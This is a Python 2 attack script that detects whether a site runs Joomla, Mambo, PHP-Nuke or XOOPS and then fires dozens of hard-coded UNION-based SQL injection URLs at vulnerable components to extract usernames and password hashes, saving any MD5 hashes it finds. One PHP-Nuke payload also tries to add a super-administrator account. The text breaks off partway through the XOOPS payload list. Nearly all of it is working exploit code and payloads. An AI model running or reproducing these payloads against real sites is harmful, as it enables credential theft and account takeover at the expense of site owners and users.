import urllib, sys, re, time,os,socket,urllib2,urllib

if len(sys.argv) != 2:
	print "\n beenudel1986[at]gmail[dot]com"
	print "\n Usage: ./cms.py <site-name>\n"
	sys.exit(1)

name = sys.argv[1]
url = "http://" +name
site = urllib.urlopen(url).readlines()
for line in site:
	if re.search("Joomla", line):
		print "\n The site is powered by Joomla CMS."
		print "\n 1. SQL Injection test "
		choice=raw_input("\n Please Enter your choice\n")
		if choice== '1':
			paths = ["index.php?option=com_hwdvideoshare&func=viewcategory&Itemid=61&cat_id=-9999999/**/union/**/select/**/000,111,222,username,password,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,2,2,2/**/from/**/jos_users/*",
				"index.php?option=com_clasifier&Itemid=61&cat_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_simpleshop&Itemid=41&cmd=section&section=-000/**/union+select/**/000,111,222,concat(username,0x3a,password),0,concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_pccookbook&page=viewuserrecipes&user_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",  
				"administrator/components/com_astatspro/refer.php?id=-1/**/union/**/select/**/0,concat(username,0x3a,password,0x3a,usertype),concat(username,0x3a,password,0x3a,usertype)/**/from/**/jos_users/*", 
				"index.php?option=com_galeria&Itemid=61&func=detail&id=-999999/**/union/**/select/**/0,0,password,111,222,333,0,0,0,0,0,1,1,1,1,1,1,444,555,666,username/**/from/**/users/*", 
				"index.php?option=com_jooget&Itemid=61&task=detail&id=-1/**/union/**/select/**/0,333,0x3a,333,222,222,222,111,111,111,0,0,0,0,0,0,0,0,1,1,2,2,concat(username,0x3a,password)/**/from/**/jos_users/*", 
				"index.php?option=com_quiz&task=user_tst_shw&Itemid=61&tid=1/**/union/**/select/**/0,concat(username,0x3a,password),concat(username,0x3a,password)/**/from/**/jos_users/*", 
				"index.php?option=com_paxxgallery&Itemid=85&gid=7&userid=2&task=view&iid=-3333%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2C1%2C2%2C3%2Cconcat(username,0x3a,password)%2F%2A%2A%2Ffrom%2F%2A%2A%2Fjos_users", 
				"index.php?option=com_xfaq&task=answer&Itemid=42&catid=97&aid=-9988%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),0x3a,password,0x3a,username,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0/**/from/**/jos_users/*", 
				"index.php?option=com_pcchess&Itemid=61&page=players&user_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*", 
				"index.php?option=com_neogallery&task=show&Itemid=5&catid=999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),concat(username,0x3a,password),concat(username,0x3a,password)/**/from%2F%2A%2A%2Fjos_users", 
				"index.php?option=com_noticias&Itemid=xcorpitx&task=detalhe&id=-99887766/**/union/**/%20select/**/0,concat(username,0x3a,password,0x3a,email),2,3,4,5/**/%20from/**/%20jos_users/*", 
				"index.php?option=com_doc&task=view&sid=-1/**/union/**/select/**/concat(username,0x3a,password),1,2,concat(username,0x3a,password),0x3a,5,6,7,8,password,username,11/**/from/**/jos_users/", 
				"index.php?option=com_marketplace&page=show_category&catid=-1+union+select+concat(username,0x3a,password),2,3+from+jos_users/*", 
				"index.php?option=com_directory&page=viewcat&catid=-1/**/union/**/select/**/0,concat(username,0x3a,password)/**/from/**/jos_users/*", 
				"index.php?option=com_neoreferences&Itemid=27&catid=99887766/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*%20where%20user_id=1=1/*", 
				"index.php?option=com_puarcade&Itemid=92&fid=-1%20union%20select%20concat(username,0x3a,password)%20from%20jos_users--",
				"index.php?option=com_ynews&Itemid=0&task=showYNews&id=-1/**/union/**/select/**/0,1,2,username,password,5,6%20from%20jos_users/*", 
				"index.php?option=com_xfaq&task=answer&Itemid=27&catid=97&aid=-9988%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),0x3a,password,0x3a,username,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0/**/from/**/jos_users/*",
				"index.php?option=com_rsgallery&page=inline&catid=-1%20union%20select%201,2,3,4,concat(username,0x3a,password),6,7,8,9,10,11%20from%20mos_users--",
				"index.php?option=com_mcquiz&task=user_tst_shw&Itemid=42&tid=1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),concat(username,0x3a,password),0x3a/**/from/**/jos_users/*",
				"index.php?option=com_paxxgallery&Itemid=85&gid=7&userid=S@BUN&task=view&iid=-3333%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2C1%2C2%2C3%2Cconcat(username,0x3a,password)%2F%2A%2A%2Ffrom%2F%2A%2A%2Fjos_users",
				"index.php?option=com_eventlist&func=details&did=9999999999999%20union%20select%200,0,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),4,5,6,7,8,9,00,0,444,555,0,777,0,999,0,0,0,0,0,0,0%20from%20jos_users/*", 
				"index.php?option=com_nicetalk&tagid=-2)%20union%20select%201,2,3,4,5,6,7,8,0,999,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),777,666,555,444,333,222,111%20from%20jos_users/*", 
				"index.php?option=com_neorecruit&task=offer_view&id=option=com_neorecruit&task=offer_view&id=99999999999%20union%20select%201,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),3,4,5,6,7,8,111,222,333,444,0,0,0,555,666,777,888,1,2,3,4,5,0%20from%20jos_users/*", 
				"index.php?option=com_gmaps&task=viewmap&Itemid=57&mapId=-1/**/union/**/select/**/0,username,password,3,4,5,6,7,8/**/from/**/jos_users/*",
				"index.php?option=com_garyscookbook&Itemid=21&func=detail&id=-666/**/union+select/**/0,0,password,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,username+from%2F%2A%2A%2Fjos_users/*",
				"index.php?option=com_ponygallery&Itemid=x&func=viewcategory&catid=%20union%20select%201,2,3,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),5,0,0%20from%20jos_users/*", 
				"index.php?option=com_joovideo&Itemid=S@BUN&task=detail&id=-99999/**/union/**/select/**/0,0,0x3a,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,2,2,2,2,2,concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_alberghi&task=detail&Itemid=S@BUN&id=-99999/**/union/**/select/**/0,0,0x3a,0,0,0,0,0,0,0,0,11,12,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_alberghi&task=detail&Itemid=S@BUN&id=-99999/**/union/**/select/**/0,0,0x3a,0,0,0,0,0,0,0,0,11,12,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_restaurante&task=detail&Itemid=S@BUN&id=-99999/**/union/**/select/**/0,0,0x3a,0,0,0,0,0,0,0,0,11,12,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,4,4,4,4,concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_acajoom&act=mailing&task=view&listid=1&Itemid=1&mailingid=1/**/union/**/select/**/1,1,1,1,concat(username,0x3a,password),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/jos_users/**/LIMIT/**/1,1/*",
				"index.php?option=com_rwcards&task=listCards&category_id=-1'union%20select%201,2,03,4,concat(char(117,115,101,114,110,97,109,101,58),username,char(112,97,115,115,119,111,114,100,58),password),50,044,076,0678,07%20from%20jos_users/*",
				"index.php?option=com_hello_world&Itemid=27&task=show&type=intro&id=-9999999/**/union/**/select/**/0x3a,username,password,0x3a/**/from/**/jos_users/*",
				"index.php?option=com_product&Itemid=12&task=viewlist&catid=-9999999/**/union/**/select/**/username,1,2,3,password,5,6,7,8,9/**/from/**/jos_users/*",
				"index.php?option=com_cms&act=viewitems&cat_id=-9999999/**/union/**/select/**/111,111,concat(username,0x3a,password),222,222,333,333/**/from/**/jos_users/*",
				"index.php?option=com_most&mode=email&secid=-9999999/**/union/**/select/**/0000,concat(username,0x3a,password),2222,3333/**/from/**/jos_users/*",
				"index.php?option=com_idvnews&id=-1/**/union/**/select/**/0,concat(username,0x3a,password),2222,concat(username,0x3a,password),0,0,0,0/**/from/**/jos_users/*",
				"index.php?option=com_joomlavvz&Itemid=34&func=detail&id=-9999999+union/**/select+0x3a,0x3a,password,0,0,0,0,0,0,0,0,0x3a,0x3a,0x3a,0x3a,username/**/from/**/jos_users/*",
				"index.php?option=com_referenzen&Itemid=7&detail=-9999999+union/**/select/**/0x3a,concat(username,0x3a,password),0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,concat(username,0x3a,password),0,0,0,0,0/**/from/**/jos_users/*",
				"index.php?option=com_genealogy&task=profile&id=-9999999/**/union/**/select/**/0,0x3a,2,0x3a,0x3a,5,0x3a,0x3a,8,concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_listoffreeads&AdId=-1/**/union/**/select/**/0,concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_facileforms&Itemid=640&user_id=107&catid=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_geoboerse&page=view&catid=-1/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_ricette&Itemid=S@BUN&func=detail&id=-9999999/**/union/**/select/**/0,0,%20%20%200x3a,111,222,333,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_team&gid=-1/**/union/**/select/**/1,2,3,password,5,6,7,8,9,10,username,12,13/**/from/**/jos_users/*",
				"index.php?option=com_formtool&task=view&formid=2&catid=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_jooget&Itemid=S@BUN&task=detail&id=-1/**/union/**/select/**/0,333,0x3a,333,222,222,222,111,111,111,0,0,0,0,0,0,0,0,1,1,2,2,concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_profile&Itemid=42&task=&task=viewoffer&oid=9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
				"index.php?option=com_sg&Itemid=16&task=order&range=3&category=3&pid=-9999999/**/union/**/select/**/0,1,concat(username,0x3a,password),0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,10,11,0x3a,0x3a,14,15,16/**/from/**/jos_users/*",
				"index.php?option=faq&task=viewallfaq&catid=-9999999/**/union/**/select/**/concat(username,0x3a,password),0x3a,0/**/from/**/jos_users/*",
				"index.php?option=com_omnirealestate&Itemid=0&func=showObject&info=contact&objid=-9999/**/union/**/select/**/username,password/**/from/**/jos_users/*&results=joomla",
				"index.php?option=com_model&Itemid=0&task=pipa&act=2&objid=-9999/**/union/**/select/**/username,password/**/from/**/jos_users/*",
				"index.php?option=com_mezun&task=edit&hidemainmenu=joomla&id=-9999999/**/union/**/select/**/concat(username,0x3a,password),username,password,0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,0x3a/**/from/**/jos_users/*",
				"index.php?option=com_ewriting&Itemid=9999&func=selectcat&cat=-1+UNION+ALL+SELECT+1,2,concat(username,0x3a,password),4,5,6,7,8,9,10+FROM+jos_users--",
				"index.php?option=com_candle&task=content&cID=-9999/**/union/**/select/**/0x3a,username,0x3a,password,0x3a,0x3a/**/from/**/jos_users/*",
				"index.php?option=com_productshowcase&Itemid=S@BUN&action=details&id=-99999/**/union/**/select/**/0,concat(username,0x3a,password),concat(username,0x3a,password),0,0,0,0,0,1,1,1,1,2,3,4,5/**/from/**/jos_users/*",
				"index.php?option=com_resman&task=moreinfo&id=-1%20union%20select%20111,concat(char(117,115,101,114,110,97,109,101,58),username,char(112,97,115,115,119,111,114,100,58),password),333%20from%20jos_users/*"] 
 			socket.setdefaulttimeout(10) 
			host = sys.argv[1] 
			print "[+] JoomlaPath:",host 
			print "[+] Vuln. Loaded:",len(paths) 
			if host[:7] != "http://": 
				host = "http://"+host
			if host[-1:] != "/": 
				host = host+"/" 
			print "[+] Testing..." 
			for path in paths:
				try: 
					#print host+path 
					source = urllib2.urlopen(host+path, "80").read() 
					md5s = re.findall("[a-f0-9]"*32,source) 
					if len(md5s) >=1: 
						print "\nHost:",host+path 
						print "Found:"
						for md5 in md5s:
							print "\t-",md5
							file=open ('hash.txt' , 'a')
							file.write( '\n' + md5)
				except(urllib2.URLError, socket.timeout, socket.gaierror, socket.error): 
					pass
				except(KeyboardInterrupt):
					pass
			print "\n[-] Done\n"
			sys.exit(1)
		
		else:
			print "\n Wrong choice..!! Shutting down the sytem!"
			time.sleep(1)
			sys.exit(1)
	if re.search("mambo" ,line):
		print "\n The site is powered by Mambo CMS "
		print "\n 1. SQL Injection Test "
		print "\n Test on the progress"
		sqls = ["index.php?option=com_akogallery&Itemid=S@BUN&func=detail&id=-334455/**/union/**/select/**/null,null,concat(password,0x3a),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,concat(0x3a,username)/**/from/**/mos_users/*",
			"index.php?option=com_catalogshop&Itemid=S@BUN&func=detail&id=-1/**/union/**/select/**/null,null,concat(password),3,4,5,6,7,8,9,10,11,12,concat(username)/**/from/**/mos_users/*",
			"index.php?option=com_restaurant&Itemid=S@BUN&func=detail&id=-1/**/union/**/select/**/0,0,password,0,0,0,0,0,0,0,0,0,username/**/from/**/mos_users/*",
			"index.php?option=com_accombo&func=detail&Itemid=S@BUN&id=-99999/**/union/**/select/**/0,1,0x3a,3,4,5,6,7,8,9,10,11,12,concat(username,0x3a,password)/**/from/**/mos_users/*",
			"index.php?option=com_glossary&func=display&Itemid=s@bun&catid=-1%20union%20select%201,username,password,4,5,6,7,8,9,10,11,12,13,14%20from%20mos_users--",
			"index.php?option=com_musepoes&task=answer&Itemid=s@bun&catid=s@bun&aid=-1/**/union/**/select/**/0,username,password,0x3a,0x3a,3,0,0x3a,0,4,4,4,0,0x3a,0,5,5,5,0,0x3a/**/from/**/mos_users/*",
			"index.php?option=com_recipes&Itemid=S@BUN&func=detail&id=-1/**/union/**/select/**/0,1,concat(username,0x3a,password),username,0x3a,5,6,7,8,9,10,11,12,0x3a,0x3a,0x3a,username,username,0x3a,0x3a,0x3a,21,0x3a/**/from/**/mos_users/*",
			"index.php?option=com_jokes&Itemid=S@BUN&func=CatView&cat=-776655/**/union/**/select/**/0,1,2,3,username,5,password,7,8/**/from/**/mos_users/*",
			"index.php?option=com_estateagent&Itemid=S@BUN&func=showObject&info=contact&objid=-9999/**/union/**/select/**/username,password/**/from/**/mos_users/*&results=S@BUN",
			"index.php?option=com_newsletter&Itemid=S@BUN&listid=9999999/**/union/**/select/**/name,password/**/from/**/mos_users/*",
			"index.php?option=com_fq&Itemid=S@BUN&listid=9999999/**/union/**/select/**/name,password/**/from/**/mos_users/*",
			"index.php?option=com_mamml&listid=9999999/**/union/**/select/**/name,password/**/from/**/mos_users/*",
			"index.php?option=com_joovideo&Itemid=S@BUN&task=detail&id=-99999/**/union/**/select/**/0,0,0x3a,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,2,2,2,2,2,concat(username,0x3a,password)/**/from/**/jos_users/*",
			"index.php?option=com_neoreferences&Itemid=27&catid=99887766/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*%20where%20user_id=1=1/*", "index.php?option=com_directory&page=viewcat&catid=-1/**/union/**/select/**/0,concat(username,0x3a,password)/**/from/**/jos_users/*",
			"index.php?option=com_shambo2&Itemid=-999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2C1%2Cconcat(username,0x3a,password)%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2F%2A%2A%2Ffrom%2F%2A%2A%2Fmos_users",
			"index.php?option=com_awesom&Itemid=S@BUN&task=viewlist&listid=-1/**/union/**/select/**/null,concat(username,0x3a,password),null,null,null,null,null,null,null/**/from/**/mos_users/*",
			"index.php?option=com_sermon&gid=-9999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),0,0,username,password%2C0%2C0%2C0/**/from/**/mos_users/*",
			"index.php?option=com_neogallery&task=show&Itemid=5&catid=999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),concat(username,0x3a,password),concat(username,0x3a,password)/**/from%2F%2A%2A%2Fjos_users",
			"index.php?option=com_gallery&Itemid=0&func=detail&id=-99999/**/union/**/select/**/0,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,username/**/from/**/mos_users/*",
			"index.php?option=com_gallery&Itemid=0&func=detail&id=-999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2C1%2Cpassword%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2Cusername%2F%2A%2A%2Ffrom%2F%2A%2A%2Fmos_users",
			"index.php?option=com_rapidrecipe&user_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
			"index.php?option=com_rapidrecipe&category_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
			"index.php?option=com_pcchess&Itemid=S@BUN&page=players&user_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
			"index.php?option=com_xfaq&task=answer&Itemid=S@BUN&catid=97&aid=-9988%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),0x3a,password,0x3a,username,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0/**/from/**/jos_users/*",
			"index.php?option=com_paxxgallery&Itemid=85&gid=7&userid=S@BUN&task=view&iid=-3333%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2C1%2C2%2C3%2Cconcat(username,0x3a,password)%2F%2A%2A%2Ffrom%2F%2A%2A%2Fjos_users",
			"index.php?option=com_mcquiz&task=user_tst_shw&Itemid=xxx&tid=1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),concat(username,0x3a,password),0x3a/**/from/**/jos_users/*",
			"index.php?option=com_mcquiz&task=user_tst_shw&Itemid=xxx&tid=1/**/union/**/select/**/0,concat(username,0x3a,password),concat(username,0x3a,password)/**/from/**/mos_users/*",
			"index.php?option=com_quiz&task=user_tst_shw&Itemid=xxx&tid=1/**/union/**/select/**/0,concat(username,0x3a,password),concat(username,0x3a,password)/**/from/**/jos_users/*",
			"index.php?option=com_quiz&task=user_tst_shw&Itemid=xxx&tid=1/**/union/**/select/**/0,concat(username,0x3a,password),concat(username,0x3a,password)/**/from/**/mos_users/*",
			"index.php?option=com_quran&action=viewayat&surano=-1+union+all+select+1,concat(username,0x3a,password ),3,4,5+from+mos_users+limit+0,20--",
			"index.php?option=com_quran&action=viewayat&surano=-1+union+all+select+1,concat(username,0x3a,password ),3,4,5+from+jos_users+limit+0,20--",
			"administrator/components/com_astatspro/refer.php?id=-1/**/union/**/select/**/0,concat(username,0x3a,password,0x3a,usertype),concat(username,0x3a,password,0x3a,usertype)/**/from/**/jos_users/*",
			"index.php?option=com_portfolio&memberId=9&categoryId=-1+union+select+1,2,3,concat(username,0x3a,password),5,6,7,8,9,10,11,12+from+mos_users/*",
			"index.php?option=com_pccookbook&page=viewuserrecipes&user_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
			"index.php?option=com_clasifier&Itemid=S@BUN&cat_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
			"index.php?option=com_hwdvideoshare&func=viewcategory&Itemid=S@BUN&cat_id=-9999999/**/union/**/select/**/000,111,222,username,password,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,2,2,2/**/from/**/jos_users/*",
			"index.php?option=com_simpleshop&Itemid=S@BUN&cmd=section&section=-000/**/union+select/**/000,111,222,concat(username,0x3a,password),0,concat(username,0x3a,password)/**/from/**/jos_users/*",
			"index.php?option=com_garyscookbook&Itemid=S@BUN&func=detail&id=-666/**/union+select/**/0,0,password,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,username+from%2F%2A%2A%2Fmos_users/*",
			"index.php?option=com_simpleboard&func=view&catid=-999+union+select+2,2,3,concat(0x3a,0x3a,username,0x3a,password),5+from+mos_users/*",
			"index.php?option=com_musica&Itemid=172&tasko=viewo &task=view2&id=-4214/**/union+select/**/0,0,password,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0+fro m%2F%2A%2A%2Fmos_users/*",
			"index.php?option=com_candle&task=content&cID=-9999/**/union/**/select/**/0x3a,username,0x3a,password,0x3a,0x3a/**/from/**/jos_users/*",
			"index.php?option=com_ewriting&Itemid=9999&func=selectcat&cat=-1+UNION+ALL+SELECT+1,2,concat(username,0x3a,password),4,5,6,7,8,9,10+FROM+jos_users--"]
		host = sys.argv[1].replace("/index.php", "")
		if host[-1] != "/":
			host = host+"/"
		if host[:7] != "http://":
			host = "http://"+host
		print "\n[+] Site:",host
		print "[+] SQL Loaded:",len(sqls) 
		print "[+] Starting Scan...\n" 
		for sql in sqls:
			time.sleep(3) #Change this if needed
			#print "[+] Trying:",host+sql.replace("\n","")
			try:
				source = urllib2.urlopen(host+sql.replace("\n","")).read()
				md5s = re.findall("[a-f0-9]"*32,source)
				if len(md5s) >= 1:
					print "[!]",host+sql.replace("\n","")
					for md5 in md5s:
						print "\n[+]MD5:",md5
			except(urllib2.HTTPError):
				pass
		print "\n[-] Done\n"
		sys.exit(1)

	if re.search("phpnuke", line):
		print "\n CMS Used is PHP-Nuke "
		paths = ["modules.php?name=Downloads&d_op=viewdownload&cid=59%20or%20cid=2",
			"modules.php?name=Reviews&rop=showcontent&id=-1%20UNION%20SELECT%200,0,aid,pwd,email,email,100,pwd,url,url,10000,name%20FROM%20nuke_authors/",
			"modules.php?name=Sections&op=viewarticle&artid=-1%20UNION%20SELECT%200,0,aid,pwd,0%20FROM%20nuke_authors",
			"modules.php?name=Sections&op=printpage&artid=-1%20UNION%20SELECT%20aid,pwd%20FROM%20nuke_authors",
			"modules.php?name=Sections&op=listarticles&secid=-1%20UNION%20SELECT%200,0,pwd,0,0%20FROM%20nuke_authors%20WHERE%201/",
			"modules.php?name=Sections&op=listarticles&secid=-1%20UNION%20SELECT%20pwd%20FROM%20nuke_authors",
			"modules.php?name=Downloads&d_op=viewdownloadeditorial&lid=-1%20UNION%20SELECT%20username,1,user_password,user_id%20FROM%20nuke_users",
			"modules.php?name=Downloads&d_op=viewdownloadcomments&lid=-1%20UNION%20SELECT%20username,user_id,user_password,1%20FROM%20nuke_users/",
			"modules.php?name=Sections&op=listarticles&secid=-1%20UNION%20SELECT%20pwd%20FROM%20nuke_authors",
			"modules.php?name=Journal&file=search&bywhat=aid&exact=1&forwhat=kala",
			"index.php?&admin=eCcgVU5JT04gU0VMRUNUIDEvKjox",
			"modules.php?name=Journal&file=search&bywhat=aid&exact=1&forwhat=kala'/**/UNION/**/SELECT/**/0,0,pwd,0,0,0,0,0,0/**/FROM/**/nuke_authors/**/WHERE/**/radminsuper=1/**/LIMIT/**/1/*",
			"admin.php?op=AddAuthor&add_aid=x0p0x&add_name=God&add_pwd=cool&add_email=bugs@victima&add_radminsuper=1&admin=eCcgVU5JT04gU0VMRUNUIDEvKjox",
			"modules.php?name=Private_Messages&file=index&folder=savebox&mode=read&p=99&pm_sql_user=AND%20pm.privmsgs_type=-99%20UNION%20SELECT%20aid,null,pwd,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20nuke_authors%20WHERE%20radminsuper=1%20LIMIT%201/",
			"modules.php?name=Web_Links&l_op=viewlink&cid=1%20UNION%20SELECT%20pwd,0%20FROM%20nuke_authors%20LIMIT%201,2",
			"modules.php?name=Web_Links&l_op=viewlink&cid=1%20UNION%20SELECT%20pwd,0%20FROM%20nuke_authors%20LIMIT%201,2",
			"modules.php?name=Web_Links&l_op=viewlink&cid=0%20UNION%20SELECT%20pwd,0%20FROM%20nuke_authors",
			"modules.php?name=Downloads&d_op=getit&lid=-1%20UNION%20SELECT%20user_password%20FROM%20nuke_users%20WHERE%20user_id=5",
			"modules.php?name=Web_Links&l_op=viewlinkeditorial&lid=-1%20UNION%20SELECT%20name,1,pwd,aid%20FROM%20nuke_authors",
			"modules.php?op=modload&name=books&file=index&req=view_cat&cid=-90900%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/char(111,112,101,114,110,97,108,101,51),concat(pn_uname,0x3a,pn_pass)+from%2F%2A%2A%2Fnuke_users/*where%20admin%201=%201",
			"modules.php?op=modload&name=books&file=index&req=view_cat&cid=-90900%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/char(121,122,111,104,110,97,112,101,54),concat(pn_uname,0x3a,pn_pass)+from%2F%2A%2A%2FpostNuke_users/*where%20admin%201=%201",
			"modules.php?name=Sections&op=viewarticle&artid=-9999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%20%20/**/0,1,aid,pwd,4/**/from/**/nuke_authors/*where%20admin%20-2",
			"modules.php?op=modload&name=EasyContent&file=index&menu=410&page_id=-1/**/union/**/select/**/0,aid/**/from/**/nuke_authors/**/where/**/radminsuper=1/*",
			"modules.php?op=modload&name=EasyContent&file=index&menu=410&page_id=-1/**/union/**/select/**/0,pwd/**/from/**/nuke_authors/**/where/**/radminsuper=1/*","modules.php?name=Okul&op=okullar&okulid=-1/**/union/**/select/**/aid,pwd/**/from/**/nuke_authors/**/where/**/radminsuper=1/*",
			"modules.php?name=Docum&op=viewarticle&artid=-1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%20%20/**/0,1,aid,pwd,4/**/from/**/nuke_authors/*where%20admin%20-2",
			"modules.php?name=Inhalt&sop=listpages&cid=-1/**/union/**/select/**/aid,2/**/from/**/nuke_authors/*where%20admin%20-2",
			"modules.php?name=Inhalt&sop=listpages&cid=-1/**/union/**/select/**/pwd,2/**/from/**/nuke_authors/*where%20admin%20-2",
			"modules.php?name=Manuales&d_op=viewdownload&cid=1/**/union/**/select/**/0,aid,pwd/**/from/**/nuke_authors/**/where/**/radminsuper=1/*",
			"modules.php?name=Siir&op=print&id=-9999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/0,aid,pwd,pwd,4/**/from+nuke_authors/*where%20admin%201%200%202",
			"modules.php?name=NukeC&op=ViewCatg&id_catg=-1/**/union/**/select/**/pwd,2/**/from/**/nuke_authors/*where%20admin%20-2",
			"modules.php?name=Kose_Yazilari&op=viewarticle&artid=-11223344%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0,1,aid,pwd,4,5%2F%2A%2A%2Ffrom%2F%2A%2A%2Fnuke_authors",
			"modules.php?name=Kose_Yazilari&op=printpage&artid=-99999999%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F0,pwd,aid,3%2F%2A%2A%2Ffrom%2F%2A%2A%2Fnuke_authors",
			"modules.php?op=modload&name=My_eGallery&file=index&do=showgall&gid=-1/**/union/**/select/**/aid,pwd/**/from/**/nuke_authors/**/where/**/radminsuper=1/*"]
		socket.setdefaulttimeout(10)
		host = sys.argv[1]
		print "[+] NukePath:",host
		print "[+] Vuln. Loaded:",len(paths)
		if host[:7] != "http://":
			host = "http://"+host
		if host[-1:] != "/":
			host = host+"/"
		print "[+] Testing..."
		for path in paths:
			try:
				#print host+path
				source = urllib2.urlopen(host+path, "80").read()
				md5s = re.findall("[a-f0-9]"*32,source)
				if len(md5s) >=1:
					print "\nHost:",host+path
					print "Found:"
					for md5 in md5s:
						print "\t-",md5
			except(urllib2.URLError, socket.timeout, socket.gaierror, socket.error):
				pass
			except(KeyboardInterrupt):
				pass
		print "\n[-] Done\n"
		sys.exit(1)

	if re.search("xoops", line):
		print "\n This is powered by XOOPS CMS"
	
		sqls = ["modules/myAds/annonces-p-f.php?op=ImprAnn&lid=-1+union+select+1,pass,uid,uname,5,6,7,8,9,10,11,12,13+from+xoops_users+limit+1,1/*",
			"modules/articles/print.php?id=3/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,uid,uname,pass,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/FROM/**/xoops_users/**/LIMIT/**/1,1/*",
			"modules/articles/index.php?cat_id=-1%20union%20select%201,2,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),4,5,6%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/articles/index.php?cat_id=-1%20union%20select%201,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),3,4%20from%20xoops_users%20where%20uid%20like%201/*",
